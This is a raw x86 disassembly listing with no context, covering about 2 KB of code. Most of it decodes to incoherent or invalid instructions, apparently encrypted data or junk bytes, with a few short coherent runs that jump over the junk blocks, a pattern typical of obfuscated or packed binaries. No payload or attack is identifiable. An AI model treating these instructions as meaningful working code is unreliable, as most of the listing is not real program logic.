  4213d2:	adc    ebx,DWORD PTR [esi+0x4]
  4213d5:	jne    0x4213c9
  4213d7:	adc    eax,DWORD PTR [edx+0x15a5c65f]
  4213dd:	jns    0x421441
  4213df:	mov    al,0xb6
  4213e1:	in     eax,0xd2
  4213e3:	mov    DWORD PTR [eax+ebx*8-0xed56cb],0x4c7028de
  4213ee:	mov    ds:0x850ca535,eax
  4213f4:	inc    ebx
  4213f5:	mov    al,dl
  4213f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213f8:	add    ebp,DWORD PTR [ebx+0x5]
  4213fb:	cmp    cl,BYTE PTR ds:0x3d89f743
  421401:	pop    esi
  421402:	or     edi,DWORD PTR [esi]
  421404:	mov    ?,WORD PTR [ecx+eiz*4-0x28558389]
  42140b:	mov    eax,0x4741d378
  421410:	nop
  421411:	lds    ebx,FWORD PTR [eax]
  421413:	dec    esi
  421414:	adc    bl,BYTE PTR [eax]
  421416:	xor    al,0x9a
  421418:	(bad)  
  421419:	jg     0x42140d
  42141b:	cwde   
  42141c:	stc    
  42141d:	pushf  
  42141e:	jno    0x4213d5
  421420:	add    dl,BYTE PTR [edi-0x78f4a820]
  421426:	jne    0x4213db
  421428:	xor    DWORD PTR [eax-0x682f4698],edi
  42142e:	fisub  DWORD PTR ds:0x61a3b1d8
  421434:	out    dx,eax
  421435:	mov    edi,0xcacdf0d0
  42143a:	stos   BYTE PTR es:[edi],al
  42143b:	int3   
  42143c:	bound  edx,QWORD PTR [edi]
  42143e:	ja     0x42149e
  421440:	mov    eax,0x235a57c8
  421445:	loopne 0x42141a
  421447:	pop    ecx
  421448:	bnd lock jne 0x421479
  42144c:	xchg   ebp,eax
  42144d:	outs   dx,BYTE PTR ds:[esi]
  42144e:	retf   
  42144f:	mov    cl,0xba
  421451:	adc    DWORD PTR [edi-0x36],edx
  421454:	call   0x692f:0x1f857bf8
  42145b:	inc    edx
  42145c:	adc    DWORD PTR ds:0x19bbbcd4,edi
  421462:	and    al,0xc6
  421464:	fs xchg esi,eax
  421466:	mov    ds:0x734dcb6,eax
  42146b:	dec    edi
  42146c:	neg    DWORD PTR [ebx]
  42146e:	or     eax,0x601
  421473:	jmp    0x421541
  421478:	ins    DWORD PTR es:[edi],dx
  421479:	and    edx,DWORD PTR [edx]
  42147b:	sbb    eax,0x736f3d5e
  421480:	jmp    0xf8b9:0x4e59193b
  421487:	imul   ebp,DWORD PTR [ebx-0x4efffe7b],0xd2000000
  421491:	cmp    bh,BYTE PTR [edi]
  421493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421494:	sbb    edi,DWORD PTR [ebp-0x775158b0]
  42149a:	adc    BYTE PTR [edx],cl
  42149c:	daa    
  42149d:	dec    edx
  42149e:	fiadd  WORD PTR [eax-0x660030b7]
  4214a4:	hlt    
  4214a5:	call   0x85399f6f
  4214aa:	jge    0x4214cc
  4214ac:	push   ds
  4214ad:	aam    0x32
  4214af:	loopne 0x421477
  4214b1:	mov    eax,ds:0x250f164a
  4214b6:	scas   al,BYTE PTR es:[edi]
  4214b7:	jnp    0x4214a4
  4214b9:	sbb    BYTE PTR [ecx+0x77],ah
  4214bc:	jnp    0x4214dc
  4214be:	in     eax,0x97
  4214c0:	cmc    
  4214c1:	push   0xd
  4214c3:	popf   
  4214c4:	mov    ds:0x131cc676,eax
  4214c9:	mov    ecx,0x372f036d
  4214ce:	adc    al,BYTE PTR [ebp+0xcf39850]
  4214d4:	loopne 0x421553
  4214d6:	push   es
  4214d7:	pop    ss
  4214d8:	add    eax,0xbc1bdbb2
  4214dd:	jg     0x421556
  4214df:	ss inc ebp
  4214e1:	xchg   ebx,eax
  4214e2:	push   ebp
  4214e3:	adc    ah,dh
  4214e5:	add    al,0xe4
  4214e7:	dec    eax
  4214e8:	and    DWORD PTR [ebp+0x37e4448d],edi
  4214ee:	retf   
  4214ef:	(bad)  
  4214f0:	hlt    
  4214f1:	in     al,0x5e
  4214f3:	gs mov esi,ecx
  4214f6:	push   ecx
  4214f7:	mov    esi,0x4c58e362
  4214fc:	ins    DWORD PTR es:[edi],dx
  4214fd:	push   edx
  4214fe:	std    
  4214ff:	dec    edi
  421500:	sbb    BYTE PTR [esi-0x312625a8],cl
  421506:	imul   ecx,DWORD PTR [edi-0x34],0xffffffb6
  42150a:	mov    ds:0xe1735f13,al
  42150f:	popf   
  421510:	sbb    ebx,DWORD PTR gs:[ebx+0x2ec2a6cc]
  421517:	xor    BYTE PTR [ebx+0x22],bl
  42151a:	pushf  
  42151b:	pop    edi
  42151c:	mov    edi,0x380be0e3
  421521:	mov    eax,DWORD PTR [esi+0x441b2abb]
  421527:	or     DWORD PTR [esi-0x23],0xffffffbb
  42152b:	nop
  42152c:	cmp    dl,BYTE PTR [eax+0x2810335b]
  421532:	pop    esi
  421533:	pop    es
  421534:	sub    ecx,DWORD PTR [eax+0x5059b579]
  42153a:	mov    al,0x9c
  42153c:	xor    eax,0x626a0362
  421541:	xor    eax,0xffffe0ef
  421546:	and    eax,ecx
  421548:	dec    ebx
  421549:	jmp    0x421617
  42154e:	aam    0x23
  421550:	dec    edx
  421551:	das    
  421552:	jmp    FWORD PTR [edi-0xb]
  421555:	sti    
  421556:	dec    BYTE PTR [ebx+ebx*1]
  421559:	sbb    al,0x72
  42155b:	adc    bl,bl
  42155d:	ret    
  42155e:	pop    esp
  42155f:	xchg   BYTE PTR [ecx],al
  421561:	add    BYTE PTR [ecx-0x49000000],dh
  421567:	inc    edx
  421568:	xchg   edx,eax
  421569:	call   0xcba858a9
  42156e:	pop    esp
  42156f:	jb     0x42159e
  421571:	sbb    eax,0xc711783c
  421576:	lds    ecx,FWORD PTR [ecx-0x41]
  421579:	mov    edx,0x5932b89f
  42157e:	fisubr DWORD PTR [ecx-0x72]
  421581:	pop    ebp
  421582:	sbb    dh,BYTE PTR [ebx-0x63]
  421585:	dec    eax
  421586:	out    dx,al
  421587:	lea    edi,[ecx+ecx*2-0x5ddd6f4a]
  42158e:	lahf   
  42158f:	and    bh,bl
  421591:	cmp    al,bh
  421593:	push   eax
  421594:	add    BYTE PTR [edi+0x6e],0xdf
  421598:	addr16 mov eax,ds:0x8ed3
  42159c:	xchg   ebp,eax
  42159d:	pop    ss
  42159e:	inc    ebp
  42159f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a0:	scas   eax,DWORD PTR es:[edi]
  4215a1:	mov    ebx,DWORD PTR [esi-0x49]
  4215a4:	cdq    
  4215a5:	dec    eax
  4215a6:	jg     0x4215ad
  4215a8:	inc    ecx
  4215a9:	fisub  DWORD PTR [ecx]
  4215ab:	mov    eax,ds:0x11d33039
  4215b0:	ins    DWORD PTR es:[edi],dx
  4215b1:	pop    esp
  4215b2:	mov    ebp,0x8e7f9ff1
  4215b7:	ficom  WORD PTR ds:0x9e5c1c19
  4215bd:	test   BYTE PTR [ecx*8-0x3f4ddbd5],bl
  4215c4:	jb     0x42163f
  4215c6:	jp     0x42156f
  4215c8:	mov    dl,BYTE PTR [esi-0x58631637]
  4215ce:	scas   eax,DWORD PTR es:[edi]
  4215cf:	xchg   ecx,eax
  4215d0:	jb     0x421609
  4215d2:	nop
  4215d3:	inc    ebx
  4215d4:	adc    BYTE PTR [edi-0x4bc9a8a1],dl
  4215da:	sbb    al,0x38
  4215dc:	mov    dl,0xfd
  4215de:	dec    ecx
  4215df:	pusha  
  4215e0:	dec    eax
  4215e1:	jae    0x4215d3
  4215e3:	sbb    ebp,DWORD PTR [esi+0x64]
  4215e6:	(bad)  
  4215e7:	out    0xa2,eax
  4215e9:	xrelease xchg DWORD PTR gs:[ebx],esi
  4215ed:	in     al,0x4e
  4215ef:	ins    DWORD PTR es:[edi],dx
  4215f0:	aad    0x6b
  4215f2:	cs jo  0x4215e7
  4215f5:	(bad)  
  4215f6:	jae    0x4215b0
  4215f8:	and    al,0xba
  4215fa:	cmp    esp,eax
  4215fc:	pop    esp
  4215fd:	sti    
  4215fe:	sub    eax,0x1fff8d1
  421603:	push   ds
  421604:	and    al,0xdc
  421606:	dec    ebp
  421607:	cli    
  421608:	and    al,0xe
  42160a:	push   ecx
  42160b:	fistp  QWORD PTR [eax+edi*4]
  42160e:	cmp    edi,ebx
  421610:	pcmpgtw mm2,QWORD PTR [edi-0x4a0756cd]
  421617:	and    eax,0x5f19
  42161c:	mov    DWORD PTR [ebp-0x18],eax
  42161f:	mov    ebx,DWORD PTR ds:0x433688
  421625:	mov    eax,ds:0x430008
  42162a:	sub    ebx,eax
  42162c:	and    ebx,DWORD PTR [ebx+eax*1]
  42162f:	mov    DWORD PTR [ebp-0x10],0x1
  421636:	mov    DWORD PTR [ebp-0x14],0x47ff
  42163d:	or     DWORD PTR ds:0x433670,0x5de9
  421647:	mov    eax,DWORD PTR [ebp-0x14]
  42164a:	mov    ebx,DWORD PTR [ebp-0x10]
  42164d:	mov    edi,0x288
  421652:	cmp    DWORD PTR ds:0x4335bc,0x0
  421659:	ja     0x421747
  42165f:	sub    DWORD PTR ds:0x4335f4,0x53ff
  421669:	jmp    0x421747
  42166e:	push   0x2a65
  421673:	call   DWORD PTR ds:0x43c834
  421679:	jmp    0x421747
  42167e:	ss nop
  421680:	and    al,0xfc
  421682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421683:	cld    
  421684:	(bad)  
  421685:	fisub  DWORD PTR [edi-0x5a]
  421688:	adc    al,0xde
  42168a:	pop    esp
  42168b:	mov    edi,0x870d9241
  421690:	add    DWORD PTR [eax],eax
  421692:	mov    cl,0x0
  421694:	add    BYTE PTR [eax],al
  421696:	in     eax,dx
  421697:	jecxz  0x421680
  421699:	outs   dx,DWORD PTR ds:[esi]
  42169a:	add    al,0x12
  42169c:	daa    
  42169d:	adc    al,0x6c
  42169f:	pop    ecx
  4216a0:	mov    esp,0x3b94e67f
  4216a5:	jbe    0x4216f2
  4216a7:	outs   dx,DWORD PTR ds:[esi]
  4216a8:	dec    ebp
  4216a9:	mov    bl,0xba
  4216ab:	loopne 0x421650
  4216ad:	or     BYTE PTR [ecx+0x3f],0xe0
  4216b1:	cli    
  4216b2:	sub    al,0xdc
  4216b4:	sbb    ebx,DWORD PTR [ebp+0x65]
  4216b7:	jo     0x421729
  4216b9:	xor    DWORD PTR [ebp+0x6bcd4e59],ebp
  4216bf:	ret    
  4216c0:	add    BYTE PTR [ecx],bh
  4216c2:	cmp    eax,DWORD PTR [edx]
  4216c4:	or     ebx,DWORD PTR [edx*4-0x535500c3]
  4216cb:	mov    ds:0x9abfaa0c,al
  4216d0:	loopne 0x421654
  4216d2:	sbb    DWORD PTR [edi-0x8],esi
  4216d5:	push   ecx
  4216d6:	(bad)  
  4216d7:	aaa    
  4216d8:	mov    esp,0x730c8705
  4216dd:	xor    eax,0x6d2b721
  4216e2:	mov    ah,0xff
  4216e4:	xchg   esp,eax
  4216e5:	pop    ecx
  4216e6:	mov    dh,0x3b
  4216e8:	adc    bh,BYTE PTR [edx+0x6c]
  4216eb:	into   
  4216ec:	mov    ds:0x1e586aa7,al
  4216f1:	jmp    0x421753
  4216f3:	add    ecx,ecx
  4216f5:	or     DWORD PTR [ecx-0xb],ecx
  4216f8:	js     0x421736
  4216fa:	mov    ebp,0x5df4c551
  4216ff:	(bad)  
  421700:	cmp    BYTE PTR [esi],cl
  421702:	fimul  DWORD PTR [ebx]
  421704:	and    al,ah
  421706:	pop    ebx
  421707:	sub    eax,0x4e2b6cea
  42170c:	fcomp  DWORD PTR [esi+0x7a]
  42170f:	imul   edi,DWORD PTR [eax-0x11],0xffffff95
  421713:	xor    dl,BYTE PTR [ebx-0x55]
  421716:	stos   DWORD PTR es:[edi],eax
  421717:	jecxz  0x421733
  421719:	mov    BYTE PTR [esi],0x1e
  42171c:	and    edx,DWORD PTR [edx+0x3e]
  42171f:	jg     0x421786
  421721:	loop   0x421798
  421723:	(bad)  
  421724:	or     eax,0x65e14af5
  421729:	stos   DWORD PTR es:[edi],eax
  42172a:	jb     0x42178b
  42172c:	inc    edi
  42172d:	das    
  42172e:	in     al,dx
  42172f:	fild   DWORD PTR [edi]
  421731:	cmp    cl,BYTE PTR [ebx+0x5f]
  421734:	lahf   
  421735:	mov    BYTE PTR [ebx+0x44],dl
  421738:	fmul   QWORD PTR [eax+0x67992c73]
  42173e:	test   ecx,edx
  421740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421741:	jbe    0x42178f
  421743:	call   0x2383ee47
  421748:	(bad)  
  421749:	mov    ecx,0xa0d
  42174e:	jmp    0x42181c
  421753:	pop    ebp
  421754:	jno    0x421746
  421756:	sti    
  421757:	cld    
  421758:	sti    
  421759:	pop    edi
  42175a:	idiv   DWORD PTR [ebx]
  42175c:	popa   
  42175d:	mov    al,0xde
  42175f:	stos   DWORD PTR es:[edi],eax
  421760:	test   DWORD PTR [esi+0x187bee4],0xb100
  42176a:	add    BYTE PTR [ebx+0x7326288],al
  421770:	adc    eax,0xaeaf42f3
  421775:	mov    cl,0x83
  421777:	sbb    BYTE PTR [ecx-0x5e7fe20f],0xd9
  42177e:	jbe    0x42172f
  421780:	test   al,0xba
  421782:	dec    ecx
  421783:	fsub   QWORD PTR [esi+0x2d]
  421786:	imul   edx,DWORD PTR [eax+0x49],0x5951e5d
  42178d:	mov    dl,BYTE PTR [ecx-0x7d]
  421790:	cdq    
  421791:	push   0x3d0927e3
  421796:	sub    ecx,ebx
  421798:	xchg   esp,eax
  421799:	xchg   ebx,eax
  42179a:	cldemote BYTE PTR [ecx+0x2374caae]
  4217a1:	add    al,0x96
  4217a3:	aas    
  4217a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217a5:	popf   
  4217a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217a7:	ins    DWORD PTR es:[edi],dx
  4217a8:	mov    bh,0x46
  4217aa:	bound  ebx,QWORD PTR [esi]
  4217ac:	push   edx
  4217ad:	rcpps  xmm4,XMMWORD PTR [eax+0x57]
  4217b1:	repnz and esp,DWORD PTR ss:[edi+edi*2-0x7ea4d04a]
  4217ba:	fistp  QWORD PTR [ebp-0x6f1e71c6]
  4217c0:	lods   eax,DWORD PTR ds:[esi]
  4217c1:	jp     0x421769
  4217c3:	jg     0x4217a2
  4217c5:	imul   ebx,DWORD PTR [esi],0x3861f9a8
  4217cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217cc:	cwde   
  4217cd:	arpl   WORD PTR [edx-0x223ee570],cx
  4217d3:	mov    edi,0x2a6c8937
  4217d8:	in     al,dx
  4217d9:	or     al,0x9d
  4217db:	popf   
  4217dc:	push   cs
  4217dd:	adc    eax,0x482641d5
  4217e2:	push   ebx
  4217e3:	push   ebx
  4217e4:	shr    dh,1
  4217e6:	cld    
  4217e7:	mov    esi,0x659163ce
  4217ec:	lods   al,BYTE PTR ds:[esi]
  4217ed:	cmp    eax,esi
  4217ef:	aad    0x6
  4217f1:	push   ecx
  4217f2:	jb     0x4217c7
  4217f4:	add    al,0x5a
  4217f6:	jo     0x4217b6
  4217f8:	dec    ecx
  4217f9:	mov    BYTE PTR [ebp-0x30195019],bh
  4217ff:	ins    BYTE PTR es:[edi],dx
  421800:	int3   
  421801:	jo     0x4217ea
  421803:	sub    bl,dl
  421805:	jecxz  0x421828
  421807:	mov    ebp,0x63a548a9
  42180c:	enter  0x208e,0x9a
  421810:	push   es
  421811:	rcr    DWORD PTR [edx+esi*4-0x4b],cl
  421815:	xor    BYTE PTR [edx-0x1b0da7da],bh
  42181b:	mov    ch,0x33
  42181d:	shl    BYTE PTR [ebx],cl
  42181f:	shl    edi,0xf3
  421822:	mov    edx,DWORD PTR [ebp-0x18]
  421825:	cmp    eax,edx
  421827:	mov    DWORD PTR ds:0x433530,0x1d30
  421831:	jae    0x4239ff
  421837:	jmp    0x421905
  42183c:	pop    ecx
  42183d:	mov    ah,0xf9
  42183f:	lock std 
  421841:	std    
  421842:	pop    ecx
  421843:	mov    ebp,0xe495f533
  421848:	mov    BYTE PTR [edi+0x1c],al
  42184b:	imul   ebp,DWORD PTR [edi-0x78],0xb10001
  421852:	add    BYTE PTR [eax],al
  421854:	leave  
  421855:	pop    ecx
  421856:	inc    ebp
  421857:	mov    edx,0xc77bc96e
  42185c:	push   ecx
  42185d:	inc    ebp
  42185e:	data16 mov BYTE PTR ds:0x20ef0893,dh
  421865:	ficom  WORD PTR [ebx]
  421867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421868:	and    ebx,DWORD PTR [edx+0x45e3df40]
  42186e:	outs   dx,DWORD PTR ds:[esi]
  42186f:	retf   0xe45e
  421872:	xor    cl,ah
  421874:	mov    bl,0x17
  421876:	sbb    ebx,edx
  421878:	push   ebp
  421879:	out    dx,al
  42187a:	or     ah,cl
  42187c:	sbb    al,bh
  42187e:	gs push edi
  421880:	lock pop edx
  421882:	lds    edx,FWORD PTR [edi-0x46a51a41]
  421888:	xchg   ebp,eax
  421889:	stc    
  42188a:	(bad)  
  42188b:	cmp    eax,0xba733b16
  421890:	fild   WORD PTR [esi+0x63]
  421893:	dec    edx
  421894:	or     ah,BYTE PTR [edi-0x2c24cc39]
  42189a:	jp     0x421862
  42189c:	mov    ah,0x96
  42189e:	inc    edx
  42189f:	out    0x1a,al
  4218a1:	fmul   QWORD PTR [esi+0x0]
  4218a4:	and    cl,bl
  4218a6:	test   BYTE PTR [ecx],cl
  4218a8:	jae    0x42184f
  4218aa:	test   al,0x4b
  4218ac:	inc    ebx
  4218ad:	jo     0x421906
  4218af:	pop    ss
  4218b0:	mul    edx
  4218b2:	cli    
  4218b3:	push   cs
  4218b4:	test   eax,0xf0546e82
  4218b9:	add    eax,0x32597fb2
  4218be:	stc    
  4218bf:	push   cs
  4218c0:	fnstenv [eax]
  4218c2:	iret   
  4218c3:	leave  
  4218c4:	dec    ebx
  4218c5:	jmp    0x4218f1
  4218c7:	and    eax,0xf7d10f39
  4218cc:	cmp    BYTE PTR [edi-0x53c6c18c],bh
  4218d2:	push   ss
  4218d3:	fidiv  DWORD PTR [edx]
  4218d5:	arpl   di,ax
  4218d7:	mov    cs,edi
  4218d9:	sbb    BYTE PTR [ebx+0xe],al
  4218dc:	repnz (bad) [edx+0x3fc59c5f]
  4218e3:	cli    
  4218e4:	icebp  
  4218e5:	xchg   ecx,eax
  4218e6:	iret   
  4218e7:	in     eax,0x2d
  4218e9:	test   eax,0xa68ca310
  4218ee:	or     DWORD PTR [edx-0x7c],ebx
  4218f1:	push   0x7e
  4218f3:	inc    esp
  4218f4:	daa    
  4218f5:	pop    ecx
  4218f6:	ins    DWORD PTR es:[edi],dx
  4218f7:	cmp    eax,0x4c5a1c79
  4218fc:	jg     0x42196c
  4218fe:	xchg   ecx,eax
  4218ff:	push   DWORD PTR [edi-0x76]
  421902:	mov    ebx,0x45c7d831
  421907:	clc    
  421908:	loop   0x421957
  42190a:	add    BYTE PTR [eax],al
  42190c:	add    DWORD PTR ds:0x43360c,edx
  421912:	mov    DWORD PTR [ebp-0xc],0x3726
  421919:	add    eax,0x32e0
  42191e:	jmp    0x4219ec
  421923:	adc    bh,dl
  421925:	cmp    ebp,ebx
  421927:	(bad)  
  421928:	push   esp
  42192a:	fild   QWORD PTR [eax+ebx*2]
  42192d:	sbb    esp,esp
  42192f:	test   DWORD PTR [ecx-0x4b],ecx
  421932:	xor    esp,DWORD PTR [eax]
  421934:	mov    DWORD PTR [ecx],eax
  421936:	add    BYTE PTR [ecx-0x28000000],dh
  42193c:	hlt    
  42193d:	popa   
  42193e:	mov    DWORD PTR [eax+esi*4],ebx
  421941:	jns    0x4218f6
  421943:	cmp    bl,dl
  421945:	js     0x4219ad
  421947:	ins    BYTE PTR es:[edi],dx
  421948:	fs sbb esp,edi
  42194b:	jg     0x4219c9
  42194d:	ins    BYTE PTR es:[edi],dx
  42194e:	cmp    BYTE PTR [ebx+0x3e],ch
  421951:	call   0x8251:0x6266f173
  421958:	xor    DWORD PTR [edx+0x38d897],edi
  42195e:	sub    eax,0x10f799cb
  421963:	pop    esp
  421964:	mov    dh,0xb2
  421966:	push   ecx
  421967:	xlat   BYTE PTR ds:[ebx]
  421968:	aad    0x2c
  42196a:	mov    esi,0xa2109963
  42196f:	aad    0x76
  421971:	mov    al,0x1c
  421973:	in     eax,dx
  421974:	loopne 0x4219c3
  421976:	scas   al,BYTE PTR es:[edi]
  421977:	pop    edx
  421978:	xlat   BYTE PTR ds:[ebx]
  421979:	push   es
  42197a:	(bad)  
  42197b:	out    0xae,eax
  42197d:	ss jae 0x42190a
  421980:	push   edx
  421981:	ds jp  0x42192b
  421984:	cmp    ebx,DWORD PTR [edi+edi*8-0x5bbf0ea0]
  42198b:	adc    BYTE PTR ds:0x94d45d54,0x88
  421992:	repz dec ecx
  421994:	sub    bh,bh
  421996:	dec    edi
  421997:	gs aad 0xeb
  42199a:	pop    ebp
  42199b:	(bad)
  42199f:	sbb    BYTE PTR [ecx-0x11c62acc],bl
  4219a5:	shl    DWORD PTR [ebx+ebp*8-0x7c],cl
  4219a9:	ins    DWORD PTR es:[edi],dx
  4219aa:	mov    dh,0x1b
  4219ac:	jg     0x421968
  4219ae:	iret   
  4219af:	data16 clc 
  4219b1:	mov    ds:0x98944883,al
  4219b6:	mov    esi,ebp
  4219b8:	inc    esp
  4219b9:	dec    ecx
  4219ba:	pop    es
  4219bb:	jbe    0x4219fd
  4219bd:	sub    DWORD PTR [ecx+0x71],esi
  4219c0:	jmp    0x6fa1:0x644a0ba7
  4219c7:	ss ins BYTE PTR es:[edi],dx
  4219c9:	push   ebx
  4219ca:	(bad)  
  4219cb:	rcr    BYTE PTR [edi+0x5d],1
  4219ce:	imul   esi,DWORD PTR [esi-0x3804857f],0xffffffed
  4219d5:	mov    al,0x8f
  4219d7:	fxrstor [ebx-0x78a547b4]
  4219de:	fs sub cl,bh
  4219e1:	jbe    0x421a4a
  4219e3:	pusha  
  4219e4:	pop    ds
  4219e5:	pop    ecx
  4219e6:	and    DWORD PTR [eax+0x377568b0],esp
  4219ec:	mov    DWORD PTR [ebp-0x10],0x2e39
  4219f3:	add    edx,DWORD PTR ds:0x4335e4
  4219f9:	mov    DWORD PTR [ebp-0x14],0x7c06
  421a00:	cmp    DWORD PTR ds:0x433540,0x0
  421a07:	jge    0x421a27
  421a0d:	or     DWORD PTR ds:0x43362c,0x1bde
  421a17:	jmp    0x421a27
  421a1c:	push   0x8ac3
  421a21:	call   DWORD PTR ds:0x43c7d0
  421a27:	mov    DWORD PTR [ebp-0x18],0x6909
  421a2e:	mov    eax,DWORD PTR [ebp-0x18]
  421a31:	mov    edx,DWORD PTR [ebp-0x14]
  421a34:	jmp    0x421b02
  421a39:	mov    eax,0x8fe686b7
  421a3e:	idiv   eax
  421a40:	push   DWORD PTR [edi+0x4b02535a]
  421a46:	mov    al,0xd
  421a48:	ret    
  421a49:	ror    DWORD PTR [ecx+0xb10001],1
  421a4f:	add    BYTE PTR [eax],al
  421a51:	sbb    cl,BYTE PTR [ebp-0x57fb0257]
  421a57:	pop    edx
  421a58:	test   DWORD PTR [ecx],ebp
  421a5a:	mov    al,ds:0x2c863e15
  421a5f:	mov    eax,ds:0xdb10856f
  421a64:	shl    cl,0x8e
  421a67:	sbb    al,0x1d
  421a69:	push   edx
  421a6a:	in     al,dx
  421a6b:	adc    al,0xe9
  421a6d:	repnz add eax,0xac881373
  421a73:	jp     0x421a95
  421a75:	cmp    DWORD PTR [eax],0x92d4b1c5
  421a7b:	pop    esp
  421a7c:	and    eax,0x24754137
  421a81:	sbb    ch,0x33
  421a84:	push   edi
  421a85:	ins    DWORD PTR es:[edi],dx
  421a86:	je     0x421aee
  421a88:	js     0x421aad
  421a8a:	and    BYTE PTR [edx],ah
  421a8c:	out    dx,eax
  421a8d:	and    eax,0x56b94f21
  421a92:	jb     0x421afe
  421a94:	popf   
  421a95:	outs   dx,BYTE PTR ds:[esi]
  421a96:	pop    ebp
  421a97:	das    
  421a98:	data16 cs out 0x4a,al
  421a9c:	pop    edx
  421a9d:	call   0xdd43:0xa6c94c3b
  421aa4:	cwde   
  421aa5:	xchg   edx,eax
  421aa6:	jmp    0x2183e9d2
  421aab:	sub    al,0x9b
  421aad:	pop    ds
  421aae:	daa    
  421aaf:	mov    fs:0x501b27bb,al
  421ab5:	ins    BYTE PTR es:[edi],dx
  421ab6:	popf   
  421ab7:	out    dx,eax
  421ab8:	je     0x421a42
  421aba:	scas   eax,DWORD PTR es:[edi]
  421abb:	cmp    DWORD PTR ds:0x635fd3a4,esi
  421ac1:	jge    0x421b06
  421ac3:	loope  0x421b02
  421ac5:	icebp  
  421ac6:	fdivr  QWORD PTR [esi]
  421ac8:	push   ebx
  421ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aca:	sub    BYTE PTR [edi+esi*4+0x739c7c04],al
  421ad1:	rcl    DWORD PTR [edx],0x51
  421ad4:	int3   
  421ad5:	das    
  421ad6:	cli    
  421ad7:	es popa 
  421ad9:	mov    dh,0x3b
  421adb:	mov    esi,0x11c087ab
  421ae0:	rcr    DWORD PTR [esi],0xbc
  421ae3:	fld    QWORD PTR [ecx]
  421ae5:	lods   eax,DWORD PTR ds:[esi]
  421ae6:	loope  0x421b66
  421ae8:	in     eax,dx
  421ae9:	and    al,0xac
  421aeb:	pop    edx
  421aec:	or     eax,0xad41bd2c
  421af1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  421af3:	mov    edi,0x21774f2e
  421af8:	fimul  WORD PTR [edx-0x4b]
  421afb:	add    eax,0x133c9d9f
  421b00:	sub    bl,cl
  421b02:	sub    edx,eax
  421b04:	mov    eax,DWORD PTR [ebp-0x10]
  421b07:	xor    edx,eax
  421b09:	mov    eax,DWORD PTR [ebp-0xc]
  421b0c:	sub    edx,0x2897
  421b12:	imul   edx,eax
  421b15:	mov    eax,DWORD PTR [ebp-0x8]
  421b18:	and    edx,eax
  421b1a:	jmp    0x421be8
  421b1f:	push   ss
  421b20:	xchg   ebx,eax
  421b21:	jmp    0x75d7:0xbe7bef52
  421b28:	and    dl,BYTE PTR [eax+0x70]
  421b2b:	fild   WORD PTR ds:0x8a82bc7a
  421b31:	add    DWORD PTR [eax],eax
  421b33:	mov    cl,0x0
  421b35:	add    BYTE PTR [eax],al
  421b37:	pop    ebp
  421b38:	rol    DWORD PTR [esi],0x34
  421b3b:	in     al,0x1b
  421b3d:	call   0x50650ece
  421b42:	in     al,0xac
  421b44:	arpl   WORD PTR [esp+edx*1+0x65],cx
  421b48:	sub    dl,bl
  421b4a:	cmp    al,BYTE PTR [edx-0x2a]
  421b4d:	inc    edi
  421b4e:	inc    edx
  421b4f:	push   es
  421b50:	jnp    0x421b25
  421b52:	push   esi
  421b53:	adc    bh,BYTE PTR [esi]
  421b55:	dec    ecx
  421b56:	aam    0x55
  421b58:	(bad)  [edx]
  421b5a:	cmp    BYTE PTR [edi+0xe],ch
  421b5d:	mov    al,0xdf
  421b5f:	xor    dl,BYTE PTR [edx*1+0x5c3673c9]
  421b66:	sbb    al,0xd
  421b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b69:	je     0x421b28
  421b6b:	loopne 0x421b25
  421b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b6e:	mov    edi,0x130f70b9
  421b73:	sub    BYTE PTR [edi],al
  421b75:	push   0x37
  421b77:	out    dx,eax
  421b78:	js     0x421bd3
  421b7a:	xchg   DWORD PTR [ebp-0x3a],eax
  421b7d:	sub    BYTE PTR [edi-0x64f19514],bh
  421b83:	pop    eax
  421b84:	stos   DWORD PTR es:[edi],eax
  421b85:	push   0x57
  421b87:	dec    ebx
  421b88:	add    BYTE PTR [edx+0x26adc060],cl
  421b8e:	fistp  DWORD PTR [ebp+0x3e]
  421b91:	jns    0x421bcf
  421b93:	push   ebx
  421b94:	(bad)  
  421b95:	pop    edi
  421b96:	jg     0x421bc0
  421b98:	and    al,bl
  421b9a:	cmp    al,0x23
  421b9c:	jge    0x421b78
  421b9e:	push   eax
  421b9f:	mov    BYTE PTR [eax+0x22e4a489],al
  421ba5:	ins    BYTE PTR es:[edi],dx
  421ba6:	imul   ebx,esp,0xffffffec
  421ba9:	enter  0xbc71,0xf6
  421bad:	pop    ebp
  421bae:	dec    esp
  421baf:	push   cs
  421bb0:	pop    edx
  421bb1:	loope  0x421bc8
  421bb3:	test   eax,0xe9c60d0
  421bb8:	imul   DWORD PTR [ebx+ebx*2]
  421bbb:	int3   
  421bbc:	inc    eax
  421bbd:	rcr    DWORD PTR [eax],cl
  421bbf:	enter  0x9db1,0xd9
  421bc3:	rol    BYTE PTR [edx+0x71],cl
  421bc6:	mov    ebp,0x82c6d129
  421bcb:	bound  eax,QWORD PTR [ebx-0x108c928c]
  421bd1:	jne    0x421be9
  421bd3:	lods   eax,DWORD PTR ds:[esi]
  421bd4:	push   ss
  421bd5:	iret   
  421bd6:	stos   BYTE PTR es:[edi],al
  421bd7:	out    dx,al
  421bd8:	cmp    eax,0x1d735aa8
  421bdd:	test   al,0x36
  421bdf:	mov    edx,0x6fa3fadd
  421be4:	pusha  
  421be5:	inc    eax
  421be6:	mov    eax,0x89c03352
  421beb:	push   ebp
  421bec:	int3   
  421bed:	mov    DWORD PTR [ebp-0x10],eax
  421bf0:	jmp    0x421cbe
  421bf5:	pop    ds
  421bf6:	or     edx,edi
  421bf8:	mov    eax,0xaf5ffbfe
  421bfd:	nop
  421bfe:	pop    esp
  421bff:	pusha  
  421c00:	or     eax,0xde222025
  421c05:	xor    ecx,DWORD PTR [ebx+0xb10001]
  421c0b:	add    BYTE PTR [eax],al
  421c0d:	addr16 in eax,dx
